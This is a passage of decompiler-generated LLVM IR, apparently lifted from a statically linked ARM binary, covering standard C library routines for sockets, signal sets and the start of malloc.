  uselistorder label %dec_label_pc_120cc, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12110 = load i32, i32* @r7, align 4
  store i32 %v3_12110, i32* %stack_var_-8, align 4
  %v0_1211c = load i32, i32* @r0, align 4
  store i32 %v0_1211c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1211c, -4095
  br i1 %tmp, label %dec_label_pc_12144, label %dec_label_pc_1212c

dec_label_pc_1212c:                               ; preds = %entry
  %v0_12130 = call i32 @__aeabi_read_tp()
  %v3_12134 = load i16, i16* @global_var_2229c.359, align 2
  %v4_12134 = sext i16 %v3_12134 to i32
  store i32 %v4_12134, i32* @r3, align 4
  %v0_12138 = load i32, i32* %r2.global-to-local, align 4
  %v1_12138 = sub i32 0, %v0_12138
  store i32 %v1_12138, i32* %r2.global-to-local, align 4
  %v3_1213c = add i32 %v4_12134, %v0_12130
  %v4_1213c = inttoptr i32 %v3_1213c to i32*
  store i32 %v1_12138, i32* %v4_1213c, align 4
  %v2_12144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %entry, %dec_label_pc_1212c
  %v1_12148 = phi i32 [ %v0_1211c, %entry ], [ -1, %dec_label_pc_1212c ]
  %v2_12144 = phi i32 [ %v3_12110, %entry ], [ %v2_12144.pre, %dec_label_pc_1212c ]
  store i32 %v2_12144, i32* @r7, align 4
  ret i32 %v1_12148

; uselistorder directives
  uselistorder i32 %v0_1211c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12144, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1214c:
  %v0_1214c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1214c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1214c
  %v5_1214c = udiv i32 %arg2, 4
  %v6_1214c = and i32 %v5_1214c, %arg1
  %v3_12150 = udiv i32 %v6_1214c, 4
  %v4_12150 = mul i32 %v6_1214c, 1073741824
  %v5_12150 = or i32 %v3_12150, %v4_12150
  %v8_12150 = and i32 %v5_12150, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1214c, %bb
  %v9_12150 = phi i32 [ %arg1, %dec_label_pc_1214c ], [ %v8_12150, %bb ]
  ret i32 %v9_12150

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12158 = load i32, i32* @r4, align 4
  store i32 %v3_12158, i32* %stack_var_-24, align 4
  %v6_12158 = load i32, i32* @r5, align 4
  %v9_12158 = load i32, i32* @r6, align 4
  %v12_12158 = load i32, i32* @r7, align 4
  %v15_12158 = load i32, i32* @r8, align 4
  %v18_12158 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @ip, align 4
  %v4_12164 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_12168 = icmp eq i32 %v4_12164, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12168, label %dec_label_pc_12180, label %entry.dec_label_pc_12188_crit_edge

entry.dec_label_pc_12188_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12188

dec_label_pc_12180:                               ; preds = %entry
  store i32 %v3_12158, i32* @r4, align 4
  store i32 %v9_12158, i32* @r6, align 4
  store i32 %v12_12158, i32* @r7, align 4
  store i32 %v15_12158, i32* @r8, align 4
  %v0_12184 = call i32 @__sys_send()
  br label %dec_label_pc_12188

dec_label_pc_12188:                               ; preds = %entry.dec_label_pc_12188_crit_edge, %dec_label_pc_12180
  %v0_12188 = call i32 @__libc_enable_asynccancel()
  %v0_1218c = load i32, i32* @r6, align 4
  store i32 %v0_1218c, i32* @r1, align 4
  store i32 %v0_12188, i32* @r5, align 4
  %v0_12198 = load i32, i32* @r8, align 4
  store i32 %v0_12198, i32* @r3, align 4
  %v0_1219c = load i32, i32* @r4, align 4
  store i32 %v0_1219c, i32* @r0, align 4
  %v0_121a0 = call i32 @__sys_send()
  store i32 %v0_121a0, i32* @r4, align 4
  %v0_121a8 = load i32, i32* @r5, align 4
  %v1_121ac = call i32 @__libc_disable_asynccancel(i32 %v0_121a8)
  %v0_121b0 = load i32, i32* @r4, align 4
  %v2_121b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_121b4, i32* @r4, align 4
  store i32 %v6_12158, i32* @r5, align 4
  store i32 %v9_12158, i32* @r6, align 4
  store i32 %v12_12158, i32* @r7, align 4
  store i32 %v15_12158, i32* @r8, align 4
  store i32 %v18_12158, i32* @lr, align 4
  ret i32 %v0_121b0

; uselistorder directives
  uselistorder label %dec_label_pc_12188, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_121c4 = load i32, i32* @r4, align 4
  store i32 %v3_121c4, i32* %stack_var_-16, align 4
  %v0_121d8 = load i32, i32* @r0, align 4
  store i32 %v0_121d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_121d8, -4095
  br i1 %tmp, label %dec_label_pc_12200, label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %entry
  %v0_121ec = call i32 @__aeabi_read_tp()
  %v3_121f0 = load i16, i16* @global_var_2229c.359, align 2
  %v4_121f0 = sext i16 %v3_121f0 to i32
  %v0_121f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121f4 = sub i32 0, %v0_121f4
  store i32 %v1_121f4, i32* %r2.global-to-local, align 4
  %v3_121f8 = add i32 %v4_121f0, %v0_121ec
  %v4_121f8 = inttoptr i32 %v3_121f8 to i32*
  store i32 %v1_121f4, i32* %v4_121f8, align 4
  %v2_12200.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %entry, %dec_label_pc_121e8
  %v1_12204 = phi i32 [ %v0_121d8, %entry ], [ -1, %dec_label_pc_121e8 ]
  %v2_12200 = phi i32 [ %v3_121c4, %entry ], [ %v2_12200.pre, %dec_label_pc_121e8 ]
  store i32 %v2_12200, i32* @r4, align 4
  ret i32 %v1_12204

; uselistorder directives
  uselistorder i32 %v0_121d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12200, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12208:
  %v0_12208 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12208, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12208
  %v2_1220c = load i32, i32* @r4, align 4
  %v5_1220c = udiv i32 %v2_1220c, 2
  %v6_1220c = and i32 %v5_1220c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12208, %bb
  %v7_1220c = phi i32 [ %arg1, %dec_label_pc_12208 ], [ %v6_1220c, %bb ]
  ret i32 %v7_1220c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12210 = load i32, i32* @r4, align 4
  store i32 %v3_12210, i32* %stack_var_-32, align 4
  %v6_12210 = load i32, i32* @r5, align 4
  %v9_12210 = load i32, i32* @r6, align 4
  %v12_12210 = load i32, i32* @r7, align 4
  %v15_12210 = load i32, i32* @r8, align 4
  %v18_12210 = load i32, i32* @sb, align 4
  %v21_12210 = load i32, i32* @sl, align 4
  %v24_12210 = load i32, i32* @lr, align 4
  %v4_12220 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_12228 = icmp eq i32 %v4_12220, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12228, label %dec_label_pc_12248, label %dec_label_pc_12254

dec_label_pc_12248:                               ; preds = %entry
  store i32 %v3_12210, i32* @r4, align 4
  store i32 %v12_12210, i32* @r7, align 4
  store i32 %v15_12210, i32* @r8, align 4
  store i32 %v18_12210, i32* %sb.global-to-local, align 4
  %v0_12250 = call i32 @__sys_sendto()
  br label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %entry, %dec_label_pc_12248
  %v0_12254 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12254, i32* @r5, align 4
  %v0_12268 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12268, i32* @r0, align 4
  %v0_12270 = call i32 @__sys_sendto()
  store i32 %v0_12270, i32* @r4, align 4
  %v0_12278 = load i32, i32* @r5, align 4
  %v1_1227c = call i32 @__libc_disable_asynccancel(i32 %v0_12278)
  %v0_12280 = load i32, i32* @r4, align 4
  %v2_12288 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12288, i32* @r4, align 4
  store i32 %v6_12210, i32* @r5, align 4
  store i32 %v9_12210, i32* @r6, align 4
  store i32 %v12_12210, i32* @r7, align 4
  store i32 %v15_12210, i32* @r8, align 4
  store i32 %v18_12210, i32* @sb, align 4
  store i32 %v21_12210, i32* @sl, align 4
  store i32 %v24_12210, i32* @lr, align 4
  ret i32 %v0_12280

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12254, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12298 = load i32, i32* @r4, align 4
  store i32 %v3_12298, i32* %stack_var_-12, align 4
  %v0_122a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122a8, -4095
  br i1 %tmp, label %dec_label_pc_122d0, label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %entry
  %v0_122bc = call i32 @__aeabi_read_tp()
  %v3_122c0 = load i16, i16* @global_var_2229c.359, align 2
  %v4_122c0 = sext i16 %v3_122c0 to i32
  store i32 %v4_122c0, i32* @r3, align 4
  %v0_122c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_122c4 = sub i32 0, %v0_122c4
  store i32 %v1_122c4, i32* %r2.global-to-local, align 4
  %v3_122c8 = add i32 %v4_122c0, %v0_122bc
  %v4_122c8 = inttoptr i32 %v3_122c8 to i32*
  store i32 %v1_122c4, i32* %v4_122c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122d0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_122d0

dec_label_pc_122d0:                               ; preds = %entry, %dec_label_pc_122b8
  %v1_122d4 = phi i32 [ %v0_122a8, %entry ], [ -1, %dec_label_pc_122b8 ]
  %v2_122d0 = phi i32 [ %v3_12298, %entry ], [ %v2_122d0.pre, %dec_label_pc_122b8 ]
  store i32 %v2_122d0, i32* @r4, align 4
  ret i32 %v1_122d4

; uselistorder directives
  uselistorder i32 %v0_122a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122d0, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122e0 = load i32, i32* @r7, align 4
  store i32 %v3_122e0, i32* %stack_var_-8, align 4
  %v0_122ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122ec, -4095
  br i1 %tmp, label %dec_label_pc_12314, label %dec_label_pc_122fc

dec_label_pc_122fc:                               ; preds = %entry
  %v0_12300 = call i32 @__aeabi_read_tp()
  %v3_12304 = load i16, i16* @global_var_2229c.359, align 2
  %v4_12304 = sext i16 %v3_12304 to i32
  store i32 %v4_12304, i32* @r3, align 4
  %v0_12308 = load i32, i32* %r2.global-to-local, align 4
  %v1_12308 = sub i32 0, %v0_12308
  store i32 %v1_12308, i32* %r2.global-to-local, align 4
  %v3_1230c = add i32 %v4_12304, %v0_12300
  %v4_1230c = inttoptr i32 %v3_1230c to i32*
  store i32 %v1_12308, i32* %v4_1230c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12314.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %entry, %dec_label_pc_122fc
  %v1_12318 = phi i32 [ %v0_122ec, %entry ], [ -1, %dec_label_pc_122fc ]
  %v2_12314 = phi i32 [ %v3_122e0, %entry ], [ %v2_12314.pre, %dec_label_pc_122fc ]
  store i32 %v2_12314, i32* @r7, align 4
  ret i32 %v1_12318

; uselistorder directives
  uselistorder i32 %v0_122ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12314, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1231c:
  %v0_1231c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1231c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1231c
  %v2_1231c = load i32, i32* @sb, align 4
  %v8_1231c = shl i32 %v2_1231c, %arg2
  %v9_1231c = and i32 %v8_1231c, %arg1
  %v2_12320 = mul i32 %v9_1231c, 74536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1231c, %bb
  %v3_12320 = phi i32 [ %arg1, %dec_label_pc_1231c ], [ %v2_12320, %bb ]
  ret i32 %v3_12320

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_1233c, label %dec_label_pc_12334

dec_label_pc_12334:                               ; preds = %entry
  %v7_12338 = icmp slt i32 %arg2, 65
  br i1 %v7_12338, label %dec_label_pc_12358, label %dec_label_pc_1233c

dec_label_pc_1233c:                               ; preds = %dec_label_pc_12334, %entry
  %v0_12340 = call i32 @__aeabi_read_tp()
  %v3_12344 = load i16, i16* @global_var_2229c.359, align 2
  %v4_12344 = sext i16 %v3_12344 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12350 = add i32 %v4_12344, %v0_12340
  %v4_12350 = inttoptr i32 %v3_12350 to i32*
  store i32 22, i32* %v4_12350, align 4
  %v0_12360.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12360

dec_label_pc_12358:                               ; preds = %dec_label_pc_12334
  %v0_12358 = call i32 @__sigaddset()
  store i32 %v0_12358, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_1233c, %dec_label_pc_12358
  %v0_12360 = phi i32 [ %v0_12360.pre, %dec_label_pc_1233c ], [ %v0_12358, %dec_label_pc_12358 ]
  ret i32 %v0_12360

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12360, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1237c = add i32 %tmp, 4
  %v3_1237c = inttoptr i32 %v2_1237c to i32*
  store i32 0, i32* %v3_1237c, align 4
  %v1_12380 = load i32, i32* %r3.global-to-local, align 4
  %v2_12380 = inttoptr i32 %v1_12380 to i32*
  store i32 0, i32* %v2_12380, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12388 = load i32, i32* @r4, align 4
  store i32 %v3_12388, i32* %stack_var_-16, align 4
  %v6_12388 = load i32, i32* @r5, align 4
  %v9_12388 = load i32, i32* @r6, align 4
  %v7_12390 = icmp eq i32 %arg2, -1
  br i1 %v7_12390, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12398 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_123b4

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_123bc

dec_label_pc_123b4:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  %v7_123b8 = icmp slt i32 %arg1, 65
  br i1 %v7_123b8, label %dec_label_pc_123d8, label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %.thread16, %dec_label_pc_123b4
  %v0_123c0 = call i32 @__aeabi_read_tp()
  %v3_123c4 = load i16, i16* @global_var_2229c.359, align 2
  %v4_123c4 = sext i16 %v3_123c4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_123d0 = add i32 %v4_123c4, %v0_123c0
  %v4_123d0 = inttoptr i32 %v3_123d0 to i32*
  store i32 22, i32* %v4_123d0, align 4
  %v0_12430.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123b4
  %v2_123d8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_123d8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_123e0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_123e0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_123f0 = call i32 @__sigaddset()
  %v0_123f8 = load i32, i32* @r5, align 4
  store i32 %v0_123f8, i32* %r1.global-to-local, align 4
  %v0_123fc = load i32, i32* @r6, align 4
  %v2_123fc = add i32 %v0_123fc, 11920
  %v2_12400 = call i32 @__GI___sigismember(i32 %v2_123fc, i32 %v0_123f8)
  store i32 %v2_123d8, i32* %r1.global-to-local, align 4
  %v0_12414 = load i32, i32* @r5, align 4
  %v3_12420 = call i32 @__libc_sigaction(i32 %v0_12414, i32 %v2_123d8, i32 %v2_12398)
  %v1_12424 = icmp slt i32 %v3_12420, 0
  br i1 %v1_12424, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_123d8
  %v5_12428 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_12428, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_123d8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_123bc, %bb32
  %v0_12430 = phi i32 [ %v5_12428, %bb31 ], [ %v0_12430.pre, %dec_label_pc_123bc ], [ -1, %bb32 ]
  %v2_12438 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12438, i32* @r4, align 4
  store i32 %v6_12388, i32* @r5, align 4
  store i32 %v9_12388, i32* @r6, align 4
  ret i32 %v0_12430

; uselistorder directives
  uselistorder i32 %v2_123d8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123bc, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1244c = add i32 %arg2, -1
  %v3_12450 = udiv i32 %v1_1244c, 32
  %v4_12454 = mul nuw nsw i32 %v3_12450, 4
  %v5_12454 = add i32 %v4_12454, %arg1
  %v6_12454 = inttoptr i32 %v5_12454 to i32*
  %v7_12454 = load i32, i32* %v6_12454, align 4
  %v1_12458 = urem i32 %v1_1244c, 32
  %v7_12460 = shl i32 1, %v1_12458
  %v8_12460 = and i32 %v7_12454, %v7_12460
  %v10_12460 = icmp ne i32 %v8_12460, 0
  %. = zext i1 %v10_12460 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1244c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12470 = load i32, i32* @r1, align 4
  %v1_12470 = add i32 %v0_12470, -1
  %v3_12474 = udiv i32 %v1_12470, 32
  %v0_12478 = load i32, i32* @r0, align 4
  %v4_12478 = mul nuw nsw i32 %v3_12474, 4
  %v5_12478 = add i32 %v0_12478, %v4_12478
  %v6_12478 = inttoptr i32 %v5_12478 to i32*
  %v7_12478 = load i32, i32* %v6_12478, align 4
  %v1_1247c = urem i32 %v1_12470, 32
  %v7_12484 = shl i32 1, %v1_1247c
  %v8_12484 = or i32 %v7_12478, %v7_12484
  store i32 %v8_12484, i32* %v6_12478, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12470, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12494 = add i32 %arg2, -1
  %v3_12498 = udiv i32 %v1_12494, 32
  %v4_1249c = mul nuw nsw i32 %v3_12498, 4
  %v5_1249c = add i32 %v4_1249c, %arg1
  %v6_1249c = inttoptr i32 %v5_1249c to i32*
  %v7_1249c = load i32, i32* %v6_1249c, align 4
  %v1_124a0 = urem i32 %v1_12494, 32
  %tmp = shl i32 -1, %v1_124a0
  %v8_124a8 = add i32 %tmp, -1
  %v9_124a8 = and i32 %v7_1249c, %v8_124a8
  store i32 %v9_124a8, i32* %v6_1249c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12494, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_124b8 = udiv i32 %arg1, 256
  store i32 %v3_124b8, i32* %r1.global-to-local, align 4
  %v2_124bc = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_124bc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_124c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_124bc, i32 %v0_124c8)
  %v0_124cc = load i32, i32* %r1.global-to-local, align 4
  %v1_124cc = add i32 %v0_124cc, 1048320
  %v3_124d0 = udiv i32 %v1_124cc, 65536
  %v1_124d4 = and i32 %v3_124d0, 8
  %v6_124d8 = shl i32 %v0_124cc, %v1_124d4
  %v1_124dc = add i32 %v6_124d8, 520192
  %v3_124e0 = udiv i32 %v1_124dc, 65536
  %v1_124e4 = and i32 %v3_124e0, 4
  %v6_124e8 = shl i32 %v6_124d8, %v1_124e4
  %v1_124ec = add i32 %v6_124e8, 245760
  %v3_124f0 = udiv i32 %v1_124ec, 65536
  %v1_124f4 = and i32 %v3_124f0, 2
  %v6_124f8 = shl i32 %v6_124e8, %v1_124f4
  store i32 %v6_124f8, i32* %r1.global-to-local, align 4
  %v1_124fc = sub nsw i32 13, %v1_124d4
  %v2_12500 = sub nsw i32 %v1_124fc, %v1_124e4
  %v3_12504 = udiv i32 %v6_124f8, 32768
  %v4_12504 = sub nuw nsw i32 -1, %v3_12504
  %v4_12508 = udiv i32 %v6_124f8, 16384
  %v5_12508 = and i32 %v4_12508, %v4_12504
  %v2_1250c = sub nsw i32 %v2_12500, %v1_124f4
  %v2_12510 = add nsw i32 %v2_1250c, %v5_12508
  %v1_12514 = add nsw i32 %v2_12510, 6
  %v0_12518 = load i32, i32* %ip.global-to-local, align 4
  %v6_12518 = lshr i32 %v0_12518, %v1_12514
  %v3_1251c = mul nsw i32 %v2_12510, 4
  %v1_12520 = add nsw i32 %v3_1251c, 32
  %v1_12524 = urem i32 %v6_12518, 4
  %v2_12528 = or i32 %v1_12524, %v1_12520
  ret i32 %v2_12528

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12530 = load i32, i32* @r4, align 4
  %v6_12530 = load i32, i32* @r5, align 4
  %v9_12530 = load i32, i32* @r6, align 4
  %v12_12530 = load i32, i32* @r7, align 4
  %v15_12530 = load i32, i32* @r8, align 4
  %v18_12530 = load i32, i32* @sb, align 4
  %v21_12530 = load i32, i32* @sl, align 4
  %v24_12530 = load i32, i32* @fp, align 4
  %v27_12530 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_12544 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 108) to i32*), align 4
  store i32 %v4_12544, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12550 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), align 4
  store i32 %v4_12550, i32* %r1.global-to-local, align 4
  %v0_12554 = load i32, i32* @r0, align 4
  store i32 %v0_12554, i32* @r5, align 4
  store i32 %v4_12544, i32* %r2.global-to-local, align 4
  %v2_1255c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1255c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v4_12568 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  store i32 %v4_12568, i32* %ip.global-to-local, align 4
  store i32 75124, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12568)
  %v0_12574 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12574, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r1, align 4
  %v4_12580 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 16) to i32*), align 4
  store i32 %v4_12580, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1258c.453 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12580)
  %v0_1258c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1258c, -32
  br i1 %tmp, label %dec_label_pc_125b0, label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_fcf8.455 to i32), i32* %r2.global-to-local, align 4
  %v0_12598 = call i32 @__aeabi_read_tp()
  store i32 %v0_12598, i32* %r0.global-to-local, align 4
  %v3_1259c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1259c = sext i16 %v3_1259c to i32
  store i32 %v4_1259c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_125a8 = add i32 %v4_1259c, %v0_12598
  %v4_125a8 = inttoptr i32 %v3_125a8 to i32*
  store i32 12, i32* %v4_125a8, align 4
  br label %dec_label_pc_12e34

dec_label_pc_125b0:                               ; preds = %entry
  %v1_125b0 = add i32 %v0_1258c, 11
  store i32 %v1_125b0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v2_125bc = icmp ugt i32 %v1_125b0, 14
  %v7_125bc = icmp eq i32 %v1_125b0, 15
  %v2_125c0 = xor i1 %v7_125bc, true
